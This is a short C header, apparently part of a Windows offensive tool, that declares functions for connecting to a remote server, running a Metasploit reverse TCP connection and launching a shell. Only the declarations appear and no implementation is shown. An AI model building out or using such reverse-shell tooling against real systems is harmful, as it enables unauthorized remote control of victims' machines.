#pragma once


#ifndef MSF_REVERSE_TCP_HEADER_H
#define MSF_REVERSE_TCP_HEADER_H

SOCKET ConnectRemoteServer(char* ipAddress, int port);
BOOL MsfReverseTcp(Arguments listAgrument);
BOOL RunShell(Arguments listAgrument);

#endif